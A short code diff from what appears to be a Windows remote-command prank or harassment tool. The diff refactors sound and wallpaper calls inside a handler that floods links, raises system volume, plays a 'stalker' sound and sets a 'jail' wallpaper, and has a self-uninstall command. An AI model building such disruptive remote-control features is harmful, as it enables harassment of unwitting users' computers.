@@ -36,7 +36,7 @@ LONG ChangeRotation(DWORD Orient) {
 }
 
 
-void openLink(const char *site) {
+void openLink(char *site) {
     if(site[0] == '\0') {
         JBlogErr("Not enough arguments");
         return;
@@ -166,8 +166,8 @@ void execCommand(JBCMD cmd)
     case JB_FUN:
         CreateLinks(180);
         SendMessageW(HWND_BROADCAST, WM_APPCOMMAND, 0, APPCOMMAND_VOLUME_UP);
-        PlaySoundA("res\\stalker.wav", NULL, SND_FILENAME | SND_ASYNC);
-        changeWallpaper("res\\jail.png");
+        play("stalker");
+        changeWallpaper("jail");
         break;
     case JB_REMOVE:
         // you should uninstall yourself NOW!!!
